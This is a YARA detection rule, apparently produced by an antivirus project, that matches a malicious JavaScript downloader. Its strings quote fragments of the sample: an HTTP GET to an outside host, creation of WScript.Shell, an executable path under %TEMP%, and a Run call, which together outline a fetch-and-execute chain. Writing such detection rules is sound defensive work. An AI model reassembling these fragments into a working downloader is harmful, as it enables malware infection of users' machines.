rule sig_20160330_cfe2dec793da258356335138f1709999 {
  meta:
    description = "datamaliciousorder - file 20160330_cfe2dec793da258356335138f1709999.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "3269d393976b9ac6b1fe6cc610b8803d5bbd30db6e3dc5cc34581dddd11a6a19"

  strings:
    $s1  = "OG[I](\"GET\", \"http://a-ntsuhan.com/k38sav\", false);" fullword ascii
    $s2  = "function TF(RU, LE){AU = AU * 1; return RU - LE;};" fullword ascii
    $s3  = "var I0 = function O() {return WScript[K](\"WScript\"+\".Shell\");}(), UK = 11;" fullword ascii
    $s4  = "if (OG[\"readystate\"] < 2 * 2) continue;" fullword ascii
    $s5  = "function JM() {return I0[\"ExpandEnvironmentStrings\"](\"%TE\"+\"MP%/\") + \"3bKi5goQ7oXF.ex\" + \"e\";};" fullword ascii
    $s6  = "function SR(){return S0 + \"\";};" fullword ascii
    $s7  = "function BI() {return ((ZL == true) && (ZL == UC)) ? 1 : AU;};" fullword ascii
    $s8  = "function Z(OE){I0[\"Run\"](OE, AU, AU);};" fullword ascii
    $s9  = "function Y(){return 22;};" fullword ascii
    $s10 = "var AT = new this[\"Date\"]();" fullword ascii
    $s11 = "function TR()" fullword ascii
    $s12 = "function XA(C) {var J = (1, 2, 3, 4, 5, C); return J;};" fullword ascii
    $s13 = "return TF(ZR, V);" fullword ascii
    $s14 = "}while (FI);" fullword ascii
    $s15 = "function WI(){return K;};" fullword ascii
    $s16 = "UC = true; " fullword ascii
    $s17 = "var DE = false;" fullword ascii
    $s18 = "var ZL = false;" fullword ascii
    $s19 = "var UC = false;" fullword ascii
    $s20 = "ZL = true; " fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}